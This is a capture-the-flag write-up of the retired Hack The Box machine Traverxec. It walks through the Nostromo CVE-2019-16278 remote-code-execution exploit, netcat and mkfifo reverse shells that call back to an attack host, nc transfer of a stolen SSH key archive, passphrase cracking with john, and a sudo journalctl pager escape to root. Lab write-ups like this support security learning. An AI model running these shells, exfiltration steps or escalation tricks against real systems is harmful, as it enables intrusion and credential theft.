# Traverxec: Hack The Box

> **Hack The Box | Linux | Easy**  
> Completed: May 2026

---

## Machine Metadata

| Field | Details |
|---|---|
| **Platform** | Hack The Box |
| **OS** | Linux: Debian 10 (Buster) x86_64 |
| **Kernel** | 4.19.0-6-amd64 |
| **Difficulty** | Easy |
| **Category** | Linux / Nostromo RCE / SSH Key Cracking / GTFOBins |
| **IP Address** | 10.129.44.206 |
| **Attack Host** | 10.10.16.236 |
| **Status** | Retired ✅ |
| **Completed** | May 2026 |
| **CVEs** | CVE-2019-16278 (Nostromo 1.9.6 RCE: path traversal) |

---

## Attack Chain Summary

| Step | Technique | Privilege |
|---|---|---|
| 1 | Full TCP scan: ports 22 and 80, `nostromo 1.9.6` in header |: |
| 2 | CVE-2019-16278 Python PoC: path traversal RCE | `www-data` |
| 3 | TTY upgrade: `python -c 'import pty; pty.spawn("/bin/bash")'` | `www-data` |
| 4 | Nostromo config `nhttpd.conf` → `homedirs_public = public_www` |: |
| 5 | `/home/david/public_www/protected-file-area/` → `backup-ssh-identity-files.tgz` |: |
| 6 | `ssh2john` → `john` cracks encrypted `id_rsa` passphrase: `hunter` |: |
| 7 | SSH as `david` with cracked key | `david` |
| 8 | `server-stats.sh` → `sudo journalctl`: pager escape via `stty rows 2` | `root` |

---

## Enumeration

### Full TCP Port Scan

```bash
Hackerpatel007_1@htb[/htb]$ ports=$(nmap -p- --min-rate=1000 -T4 10.129.44.206 \
  | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
Hackerpatel007_1@htb[/htb]$ nmap -p$ports -sC -sV 10.129.44.206
```

```
Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 10.129.44.206
Host is up (0.26s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey:
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
80/tcp open  http    nostromo 1.9.6
|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
| http-methods:
|_  Supported Methods: GET HEAD POST
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 38.24 seconds
```

**Key findings:**

| Port | Service | Notes |
|---|---|---|
| 22 | OpenSSH 7.9p1 | Useful once credentials or SSH key found |
| 80 | **nostromo 1.9.6** | Non-standard web server: version in server header |

The critical finding is in the `http-server-header`: **`nostromo 1.9.6`**. This is not Apache or Nginx: it is `nhttpd` (Nostromo), an obscure open source web server. The exact version being disclosed immediately prompts a CVE search. Nostromo 1.9.6 is vulnerable to CVE-2019-16278, an unauthenticated remote code execution vulnerability.

### Web Application: Port 80

Browsing to `http://10.129.44.206/` shows a personal portfolio site for **David White**: confirming `david` as a target username. Gobuster finds nothing meaningful: the web content itself is irrelevant. The attack path is the server software, not the application.

---

## Foothold: CVE-2019-16278 (Nostromo 1.9.6 RCE)

### Vulnerability Background

CVE-2019-16278 is an unauthenticated remote code execution vulnerability in Nostromo (nhttpd) versions up to and including 1.9.6. The vulnerability lies in how the `http_verify()` function handles path traversal in the URL. By combining a null byte, path traversal sequences (`/../`), and a crafted HTTP request, an attacker can break out of the document root and execute arbitrary shell commands on the server.

**Mechanism:** Nostromo's `HOMEDIRS` feature serves user home directories under URLs like `/~username/`. The path traversal bypass tricks Nostromo into processing an OS command instead of a file path. Specifically, a request crafted as `POST /.%0d./.%0d./.%0d./.%0d./bin/sh` bypasses the path validation and passes shell commands to `execve()`.

**Affected versions:** Nostromo nhttpd ≤ 1.9.6  
**Patched in:** 1.9.7

### Step 1: Confirm RCE

```bash
Hackerpatel007_1@htb[/htb]$ searchsploit nostromo
```

```
------------------------------------------------------------------
 Exploit Title                                             |  Path
------------------------------------------------------------------
nostromo 1.9.6 - Remote Code Execution                    | multiple/remote/47837.py
------------------------------------------------------------------
```

```bash
Hackerpatel007_1@htb[/htb]$ searchsploit -m multiple/remote/47837.py
Hackerpatel007_1@htb[/htb]$ python2 47837.py 10.129.44.206 80 id
```

```
HTTP/1.1 200 OK
Date: Wed, 13 May 2026 10:06:10 GMT
Server: nostromo 1.9.6
Connection: close

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

RCE confirmed as `www-data`.

### Step 2: Reverse Shell

Start the listener:

```bash
Hackerpatel007_1@htb[/htb]$ nc -lvnp 4444
```

```
Ncat: Listening on 0.0.0.0:4444
```

Trigger the reverse shell via the exploit:

```bash
Hackerpatel007_1@htb[/htb]$ python2 47837.py 10.129.44.206 80 \
  "nc -e /bin/bash 10.10.16.236 4444"
```

If `nc -e` is not available:

```bash
Hackerpatel007_1@htb[/htb]$ python2 47837.py 10.129.44.206 80 \
  "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.16.236 4444 >/tmp/f"
```

```
connect to [10.10.16.236] from (UNKNOWN) [10.129.44.206] 54706
```

Shell received as `www-data`.

### Step 3: TTY Upgrade

```bash
www-data@traverxec:/usr/bin$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@traverxec:/usr/bin$
```

> Note: Python2 (`python`) is available on Debian 10, not `python3`.

---

## Lateral Movement: www-data → david

### Step 1: Enumerate Nostromo Configuration

```bash
www-data@traverxec:/$ cat /etc/passwd | grep -v nologin | grep -v false
```

```
root:x:0:0:root:/root:/bin/bash
david:x:1000:1000:david,,,:/home/david:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

`david` is the only interactive user besides root.

```bash
www-data@traverxec:/$ ls /var/nostromo/conf/
```

```
mimes  nhttpd.conf
```

```bash
www-data@traverxec:/$ cat /var/nostromo/conf/nhttpd.conf
```

```
# MAIN [MANDATORY]
servername              traverxec.htb
serverlisten            *
serveradmin             david@traverxec.htb
serverroot              /var/nostromo
servermimes             conf/mimes
docroot                 /var/nostromo/htdocs
docindex                index.html

# LOGS [OPTIONAL]
logpid                  logs/nhttpd.pid

# SECURITY [OPTIONAL]
serverstring            nostromo 1.9.6
ident                   nostromo

# PHP [OPTIONAL]
#php                    /usr/bin/php-cgi

# HOMEDIRS [OPTIONAL]
homedirs                /home
homedirs_public         public_www
```

**Critical finding:** The `HOMEDIRS` section reveals two things:

1. `homedirs = /home`: user home directories are served
2. `homedirs_public = public_www`: the public subdirectory is named `public_www`

This means `http://10.129.44.206/~david/` serves `/home/david/public_www/`. Even though `/home/david/` is not directly readable as `www-data`, the `public_www` subdirectory may be accessible.

```bash
www-data@traverxec:/$ ls -la /home/david/
```

```
ls: cannot open directory '/home/david/': Permission denied
```

```bash
www-data@traverxec:/$ ls -la /home/david/public_www/
```

```
total 16
drwxr-xr-x 3 david david 4096 Oct 25  2019 .
drwx--x--x 5 david david 4096 Oct 25  2019 ..
-rw-r--r-- 1 david david  402 Oct 25  2019 index.html
drwxr-xr-x 2 david david 4096 Oct 25  2019 protected-file-area
```

`public_www` is readable. A `protected-file-area` subdirectory exists inside it.

### Step 2: Extract Backup SSH Keys

```bash
www-data@traverxec:/$ ls -la /home/david/public_www/protected-file-area/
```

```
total 16
drwxr-xr-x 2 david david 4096 Oct 25  2019 .
drwxr-xr-x 3 david david 4096 Oct 25  2019 ..
-rw-r--r-- 1 david david   45 Oct 25  2019 .htaccess
-rw-r--r-- 1 david david 1915 Oct 25  2019 backup-ssh-identity-files.tgz
```

`backup-ssh-identity-files.tgz`: a compressed archive of SSH keys. Transfer it to the attack host:

```bash
# On Kali: start receiver
Hackerpatel007_1@htb[/htb]$ nc -lvnp 1234 > backup-ssh-identity-files.tgz

# On target: send the file
www-data@traverxec:/$ nc 10.10.16.236 1234 < \
  /home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz
```

Extract on Kali:

```bash
Hackerpatel007_1@htb[/htb]$ tar -xvf backup-ssh-identity-files.tgz
```

```
home/david/.ssh/
home/david/.ssh/authorized_keys
home/david/.ssh/id_rsa
home/david/.ssh/id_rsa.pub
```

The archive contains David's full SSH key pair. The private key `id_rsa` can be used to SSH in, but it is passphrase-protected:

```bash
Hackerpatel007_1@htb[/htb]$ chmod 400 home/david/.ssh/id_rsa
Hackerpatel007_1@htb[/htb]$ ssh -i home/david/.ssh/id_rsa david@10.129.44.206
```

```
Enter passphrase for key 'home/david/.ssh/id_rsa':
```

Passphrase required. Crack it.

### Step 3: Crack id_rsa Passphrase with ssh2john + john

`ssh2john` converts the encrypted private key into a hash format that John the Ripper can attack:

```bash
Hackerpatel007_1@htb[/htb]$ python3 /usr/share/john/ssh2john.py home/david/.ssh/id_rsa > id_rsa.hash
Hackerpatel007_1@htb[/htb]$ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
```

```
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status

hunter           (home/david/.ssh/id_rsa)

1g 0:00:00:07 DONE
Session completed
```

**SSH key passphrase: `hunter`**

### Step 4: SSH as david

```bash
Hackerpatel007_1@htb[/htb]$ ssh -i home/david/.ssh/id_rsa david@10.129.44.206
```

```
Enter passphrase for key 'home/david/.ssh/id_rsa': hunter

Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
Last login: Wed May 13 10:05:45 2026 from 10.10.16.236
david@traverxec:~$
```

```bash
david@traverxec:~$ cat user.txt
617995efd47f640b372ed6513d5cd4d7
```

---

## Privilege Escalation: david → root

### Step 1: Enumerate david's Home Directory

```bash
david@traverxec:~$ ls -la
```

```
total 36
drwx--x--x 5 david david 4096 Oct 25  2019 .
drwxr-xr-x 3 root  root  4096 Oct 25  2019 ..
lrwxrwxrwx 1 root  root     9 Oct 25  2019 .bash_history -> /dev/null
-rw-r--r-- 1 david david  220 Oct 25  2019 .bash_logout
-rw-r--r-- 1 david david 3526 Oct 25  2019 .bashrc
drwx------ 2 david david 4096 Oct 25  2019 .gnupg
drwxr-xr-x 3 david david 4096 Oct 25  2019 .local
-rw-r--r-- 1 david david  807 Oct 25  2019 .profile
drwx--x--x 2 david david 4096 Oct 25  2019 bin
-rw-r--r-- 1 david david   33 Oct 25  2019 user.txt
```

The `bin` directory is custom: non-standard user `bin` folders are always worth inspecting.

```bash
david@traverxec:~/bin$ ls -la
```

```
total 16
drwx--x--x 2 david david 4096 Oct 25  2019 .
drwx--x--x 5 david david 4096 Oct 25  2019 ..
-r-------- 1 david david  802 Oct 25  2019 server-stats.head
-rwx------ 1 david david  363 Oct 25  2019 server-stats.sh
```

### Step 2: Read server-stats.sh

```bash
david@traverxec:~/bin$ cat server-stats.sh
```

```bash
#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
```

**Critical line:**

```bash
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
```

`david` can run `/usr/bin/journalctl` as root via sudo: hardcoded inside this script. The `| /usr/bin/cat` at the end pipes the output to cat, which *prevents* the pager from opening when run from the script.

### Step 3: Understand the GTFOBins journalctl Escape

`journalctl` displays log output using the system pager: typically `less`. `less` is an interactive program that supports `!command` to execute OS commands, and since `journalctl` is running as root via sudo, those commands inherit root privileges.

**The trap in the script:** The `| /usr/bin/cat` pipe at the end of the script command bypasses the pager entirely. All output goes to cat instead of less, and the shell escape never has a chance to open. To exploit this, journalctl must be run **directly** without the pipe:

```bash
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
```

**But there's a second problem:** `less` only opens its interactive pager if the output *doesn't fit on the screen*. With `-n5` (5 log lines), on a normal terminal with 38+ rows, the output fits completely and `less` passes through without pausing. No pager = no shell escape.

### Step 4: The stty Fix (The Real Trick)

The solution is to shrink the terminal height to fewer rows than the output: forcing `less` to paginate instead of passing through.

Run the full TTY upgrade sequence first if not already done:

```bash
david@traverxec:~/bin$ export TERM=xterm
```

Force the terminal to only 2 rows: guaranteed smaller than any log output:

```bash
david@traverxec:~/bin$ stty rows 2 && /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
```

```
-- Logs begin at Wed 2026-05-13 10:05:16 EDT, end at Wed 2026-05-13 10:12:18 EDT. --
May 13 10:05:18 traverxec systemd[1]: Starting nostromo nhttpd server...
```

`less` opens and pauses: the output exceeds the 2-row terminal. The pager is now active with root privileges.

### Step 5: Shell Escape from less

With `less` open as root, type the shell escape command:

```
!/bin/bash
```

```
root@traverxec:/home/david/bin#
```

```bash
root@traverxec:/home/david/bin# id
uid=0(root) gid=0(root) groups=0(root)
```

Root shell obtained.

---

## Flag Collection

### user.txt

```bash
david@traverxec:~$ cat /home/david/user.txt
```

```
617995efd47f640b372ed6513d5cd4d7
```

### root.txt

```bash
root@traverxec:/home/david/bin# cat /root/root.txt
```

```
6f96b2c57f6f03ab1a7fc3ba4b34c273
```

### Flag Summary

| Flag | Location | Hash |
|---|---|---|
| **user.txt** | `/home/david/user.txt` | `617995efd47f640b372ed6513d5cd4d7` |
| **root.txt** | `/root/root.txt` | `6f96b2c57f6f03ab1a7fc3ba4b34c273` |

---

## Why journalctl Wasn't Opening the Pager: Full Explanation

This is the part that separates a methodical tester from one who gives up. Here is the full reasoning chain:

**Problem:** Running `sudo journalctl -n5 -unostromo.service` exits immediately without entering the pager.

**Root cause: how `less` decides whether to paginate:**  
`less` checks if the total output line count exceeds the terminal's row count (`stty rows`). If output fits, it prints everything and exits. If output doesn't fit, it enters interactive pager mode.

With `-n5`, journalctl outputs approximately 7 lines (log header + 5 entries). A standard terminal has 38-80 rows. `7 < 38` → output fits → `less` exits immediately → no pager → no escape opportunity.

**The fix: `stty rows 2`:**  
Setting the terminal to 2 rows makes it impossible for any non-trivial output to fit. `7 > 2` → output doesn't fit → `less` enters pager mode → `!/bin/bash` spawns root shell.

**Why the script's pipe blocks the exploit:**  
The `server-stats.sh` script ends with `| /usr/bin/cat`. Piping journalctl's output to another process disables `less` entirely: piped output goes to cat, not a pager. This is why the exploit requires running journalctl **directly** without the pipe, and why reading the script carefully before running it matters.

```
Script command:   sudo journalctl ... | cat   → no pager → no escape
Direct command:   sudo journalctl ...         → less opens if output > terminal height
With stty rows 2: sudo journalctl ...         → always opens pager → !/bin/bash → root
```

---

## Full Attack Chain Reference

```
[Recon] nmap -p- → ports 22/80, http-server-header: nostromo 1.9.6
    │
    └─[CVE-2019-16278] path traversal RCE: searchsploit 47837.py
            └─ python2 exploit.py 10.129.44.206 80 "rm /tmp/f;mkfifo /tmp/f;..."
                    └─ www-data@traverxec
                            │
                            └─[Enum] cat /var/nostromo/conf/nhttpd.conf
                                    └─ homedirs_public = public_www
                                            │
                                            └─ /home/david/public_www/protected-file-area/
                                                    └─ backup-ssh-identity-files.tgz
                                                            │
                                                            └─[Transfer] nc → tar extract
                                                                    └─ id_rsa (encrypted)
                                                                            │
                                                                            └─[ssh2john + john]
                                                                              passphrase: hunter
                                                                                    │
                                                            [SSH] david@10.129.44.206
                                                                    │
                                                            ├─ user.txt → 617995efd47f640b372ed6513d5cd4d7
                                                            │
                                                            └─[~/bin/server-stats.sh]
                                                                sudo journalctl NOPASSWD (hardcoded)
                                                                        │
                                                                ├─[Problem 1] | cat in script → no pager
                                                                ├─[Problem 2] terminal too tall → less exits
                                                                │
                                                                └─[Fix] export TERM=xterm
                                                                       stty rows 2
                                                                       sudo journalctl -n5 -unostromo.service
                                                                               └─ less opens (7 lines > 2 rows)
                                                                                       └─ !/bin/bash
                                                                                               └─ root@traverxec
                                                                                                       └─ root.txt → 6f96b2c57f6f03ab1a7fc3ba4b34c273
```

---

## Commands Reference

| Command | Purpose |
|---|---|
| `nmap -p- --min-rate=1000 -T4 10.129.44.206` | Fast full port discovery |
| `nmap -p22,80 -sC -sV 10.129.44.206` | Service version scan |
| `searchsploit nostromo` | Find CVE-2019-16278 exploit |
| `python2 47837.py 10.129.44.206 80 id` | Verify RCE with id |
| `python2 47837.py 10.129.44.206 80 "rm /tmp/f;mkfifo /tmp/f;..."` | Trigger reverse shell |
| `nc -lvnp 4444` | Catch reverse shell |
| `python -c 'import pty; pty.spawn("/bin/bash")'` | Upgrade to PTY (python2 on Debian 10) |
| `cat /var/nostromo/conf/nhttpd.conf` | Read Nostromo config: find homedirs_public |
| `ls -la /home/david/public_www/protected-file-area/` | Find SSH backup archive |
| `nc -lvnp 1234 > backup-ssh-identity-files.tgz` | Receive file on Kali |
| `nc 10.10.16.236 1234 < /home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz` | Send file from target |
| `tar -xvf backup-ssh-identity-files.tgz` | Extract SSH keys |
| `python3 /usr/share/john/ssh2john.py id_rsa > id_rsa.hash` | Convert key to crackable hash |
| `john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash` | Crack RSA key passphrase |
| `ssh -i id_rsa david@10.129.44.206` | SSH with cracked key (passphrase: hunter) |
| `cat ~/bin/server-stats.sh` | Read script: find hardcoded sudo journalctl |
| `export TERM=xterm` | Set terminal type for pager compatibility |
| `stty rows 2` | Force terminal to 2 rows: makes pager open |
| `/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service` | Trigger journalctl directly (no pipe) |
| `!/bin/bash` | Shell escape from within less as root |
| `cat /root/root.txt` | Read root flag |

---

## Lessons Learned

**1. Server header version disclosure is a direct CVE fingerprint.**  
`nostromo 1.9.6` in the `http-server-header` nmap output identified the exact vulnerable version before touching the web application. Version disclosure in server headers is a P3/P4 finding on its own, but when it reveals a known-RCE version, it becomes P1. Always cross-reference every version string against CVE databases and searchsploit.

**2. Read web server configuration files: they describe the filesystem.**  
`nhttpd.conf` with `homedirs_public = public_www` told us exactly where to look: `/home/david/public_www/`. Without reading the config, the SSH backup archive would never be found. Server configuration files in `/etc/` and service-specific directories (`/var/nostromo/conf/`) are mandatory reading during lateral movement enumeration.

**3. Encrypted SSH private keys are crackable: `ssh2john` + `john` is the standard path.**  
`id_rsa` was passphrase-protected, but `hunter` was in `rockyou.txt`. Whenever you find an SSH private key, always attempt to crack it. The two-step is: `ssh2john → john`. The pattern is identical to `gpg2john` for PGP keys (TomGhost): John the Ripper handles both.

**4. `| cat` in a script is a pager killer: always run the binary directly.**  
The `server-stats.sh` script used `| /usr/bin/cat` specifically to prevent the `less` pager from opening. This is either a deliberate machine design choice or a realistic misconfiguration where a developer suppressed pager output for scripting purposes. The lesson: when a GTFOBins pager escape appears in a script but doesn't work, check if the output is being piped. Run the binary standalone, without the pipe.

**5. `stty rows 2` is the key to forcing `less` to paginate on small output.**  
`less` uses the terminal's row count to decide whether to paginate. `-n5` produces ~7 lines. A standard 38-row terminal shows those 7 lines without paginating. Shrinking the terminal to 2 rows guarantees any multi-line output will trigger the pager. This technique applies to any pager-based GTFOBins escape where the output is small: `man`, `more`, `less`, `git`, `journalctl` all behave the same way.

**6. `~/bin` is a non-standard directory that's always suspicious.**  
Users don't normally have a `bin` directory in their home folder. Finding one means the user has custom scripts or binaries, and those scripts may have elevated permissions or sudo entries. Always `ls -la ~/bin` after pivoting to a new user.

**7. `.bash_history -> /dev/null` means the user knows what they're doing: enumerate harder.**  
David's `.bash_history` was symlinked to `/dev/null`, eliminating shell history. This is an operational security measure. When a user cleans their tracks, it means there's something worth hiding. Compensate by reading config files, scripts, and running `find / -user david -writable 2>/dev/null` more thoroughly.

---

## References

- [CVE-2019-16278: NVD](https://nvd.nist.gov/vuln/detail/CVE-2019-16278)
- [Nostromo nhttpd Security Advisory](https://www.nazgul.ch/dev/nostromo_nhttpd_ChangeLog.txt)
- [Exploit-DB 47837: Nostromo 1.9.6 RCE](https://www.exploit-db.com/exploits/47837)
- [GTFOBins: journalctl](https://gtfobins.github.io/gtfobins/journalctl/)
- [GTFOBins: less (pager)](https://gtfobins.github.io/gtfobins/less/)

---

*HTB Retired Machine: Traverxec | Completed May 2026 | Flags included per HTB retired machine policy.*
